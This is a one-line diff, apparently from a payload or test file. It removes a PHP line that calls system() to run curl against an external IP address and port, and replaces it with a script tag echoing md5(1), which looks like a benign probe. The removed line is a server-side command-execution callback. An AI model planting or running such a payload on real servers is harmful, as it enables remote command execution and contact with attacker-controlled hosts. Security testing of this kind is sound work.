@@ -1,1 +1,1 @@
-<?php system("curl 18.218.61.87:9001") ?>
+<script><?php echo md5(1) ?></script>
